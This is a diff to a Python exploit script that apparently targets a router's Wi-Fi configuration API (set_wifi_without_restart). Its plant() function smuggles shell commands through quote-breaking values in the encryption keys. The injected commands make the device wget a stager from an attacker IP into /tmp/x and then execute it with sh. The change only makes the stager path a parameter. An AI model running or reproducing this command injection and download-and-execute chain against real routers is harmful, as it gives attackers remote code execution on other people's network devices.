@@ -446,7 +446,7 @@ def require_cap_sink_ready(host, stok):
     return netmode
 
 
-def plant(host, stok, attacker_ip, serve_port, bands):
+def plant(host, stok, attacker_ip, serve_port, bands, stager_path="/s"):
     """Write the two-stage payload into the 2.4/5 GHz `encryption` keys.
 
     set_wifi_without_restart writes UCI without bouncing the radios, so the
@@ -462,7 +462,8 @@ def plant(host, stok, attacker_ip, serve_port, bands):
     ssid5 = bands[1]["ssid"] if len(bands) > 1 else ssid24
     log(f"[3] SSIDs preserved: 2.4G={ssid24!r} 5G={ssid5!r}")
 
-    p_fetch = f'\\" wget http://{attacker_ip}:{serve_port}/s -O /tmp/x #'
+    p_fetch = (f'\\" wget http://{attacker_ip}:{serve_port}'
+               f'{stager_path} -O /tmp/x #')
     p_exec = '\\" sh /tmp/x #'
 
     r1 = api(host, stok, "api/xqnetwork/set_wifi_without_restart",
